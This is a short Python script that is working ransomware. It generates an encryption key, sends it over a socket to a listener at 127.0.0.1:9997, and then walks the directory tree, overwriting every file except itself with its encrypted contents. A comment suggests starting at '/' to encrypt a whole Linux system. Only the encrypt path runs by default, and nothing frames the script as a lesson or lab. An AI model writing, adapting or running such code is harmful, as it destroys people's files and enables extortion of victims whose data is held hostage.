import os
import socket
import sys

from cryptography.fernet import Fernet

key = Fernet.generate_key()
fnet = Fernet(key)


def send_key(): # not sure about security with transmiting data over leaked ip

    TARGET = '127.0.0.1'
    PORT = 9997

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((TARGET, PORT))
    client.send(key)
    client.close()


def manage_file(file, mode='encrypt'):

    if mode == 'encrypt':
        with open(file, 'rb') as f:
            content = f.read()

        encrypted = fnet.encrypt(content)

        with open(file, 'wb') as f:
            f.write(encrypted)
    
    elif mode == 'decrypt':
        with open(file, 'rb') as f:
            content = f.read()

        decrypted = fnet.decrypt(content)

        with open(file, 'wb') as f:
            f.write(decrypted)


def path_walker():

    start = os.getcwd() # or '/' for scanning whole system on Linux

    for root, dirs, files in os.walk(start):

        for file in files:
            if file != sys.argv[0]:
                manage_file(f"{root}/{file}")


def main():

    send_key()
    path_walker()


if __name__ == '__main__':
    main()